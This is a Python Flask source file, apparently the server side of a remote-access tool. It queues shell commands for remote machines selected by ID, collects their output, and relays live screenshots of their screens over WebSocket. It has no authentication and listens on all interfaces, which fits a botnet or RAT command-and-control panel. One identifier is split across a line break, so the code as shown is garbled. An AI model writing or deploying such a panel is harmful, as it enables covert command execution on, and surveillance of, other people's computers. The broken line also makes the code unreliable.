import time
from flask import (
    Flask, request, render_template_string, redirect, url_for
)
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# état global
commande = ""
resultat_commande = ""
destinataires = ""
mode = "cmd"
last_host = ""
last_frame = ""  # base64 string

# template
html = """
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Remote Control</title>
<style>
  body{font-family:sans-serif;padding:20px}
  .sec{margin-top:30px}
  #stream{max-width:90vw;border:1px solid #ccc;display:block}
</style>
</head><body>
  <h1>🖥 Remote Control</h1>

  <div class="sec">
    <h2>Mode</h2>
    <form action="/set_mode" method="post">
      <button name="mode" value="live" {% if mode=='live'%}disabled{% endif%}>
        🔴 Live
      </button>
      <button name="mode" value="cmd" {% if mode=='cmd'%}disabled{% endif%}>
        ⚪ Command
      </button>
    </form>
  </div>

  {% if mode=='cmd' %}
  <div class="sec">
    <h2>Send Batch Command</h2>
    <form action="/" method="post">
      <input name="commande" size="50" placeholder="Commande" value="{{commande}}">
      <br><br>
      <input name="destinataires" placeholder="* or ID1,ID2" value="{{destinataires}}">
      <button type="submit">▶️ Send</button>
    </form>
    <form action="/clear" method="post">
      <button>🗑️ Clear</button>
    </form>
    <p><b>Last cmd:</b> {{commande or "(none)"}}</p>
    <pre>{{resultat or "(empty)"}}</pre>
  </div>
  {% endif %}

  {% if mode=='live' %}
  <div class="sec">
    <h2>Live Screen ({{last_host or "–"}})</h2>
    <img id="stream" src="data:image/png;base64,{{last_frame}}">
  </div>
  <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
  <script>
    const socket = io();
    const img = document.getElementById('stream');
    socket.on('frame', data => {
      img.src = 'data:image/png;base64,' + data.frame;
      document.querySelector('h2').innerText = 'Live Screen (' + data.id + ')';
    });
  </script>
  {% endif %}

</body></html>
"""

@app.route("/", methods=["GET","POST"])
def index():
    global commande, destinataires
    if request.method=="POST":
        commande = request.form.get("commande","").strip()
        destinataires = request.form.get("destinataires","").strip()
    return render_template_string(
        html,
        mode=mode,
        commande=commande,
        destinataires=destinataires,
        resultat=resultat_commande,
        last_host=last_host,
        last_frame=last_frame
    )

@app.route("/set_mode", methods=["POST"])
def set_mode():
    global mode
    m = request.form.get("mode")
    if m in ("live","cmd"):
        mode = m
    return redirect(url_for("index"))

@app.route("/get_mode")
def get_mode():
    return mode

@app.route("/get_commande")
def get_commande():
    mid = request.args.get("id","")
    if not mid: return "",400
    if destinataires=="*" or \
       (destinataires.startswith("!") and mid not in destinataires[1:].split(",")) or \
       (not destinataires.startswith("!") and dest
       inataires and mid in destinataires.split(",")):
        return commande
    return ""

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande
    mid = request.form.get("id","")
    res = request.form.get("resultat","")
    resultat_commande += f"\n[{mid}]\n{res}\n"
    return "OK",200

# --- WebSocket pour le live screen ---
@socketio.on('frame')
def on_frame(data):
    global last_frame, last_host
    last_host = data['id']
    last_frame = data['frame']
    # rebroadcast à tous les clients
    emit('frame', {'id': last_host, 'frame': last_frame}, broadcast=True)

if __name__ == "__main__":
    # utilisez eventlet pour les websockets basés threads
    socketio.run(app, host="0.0.0.0", port=5000)
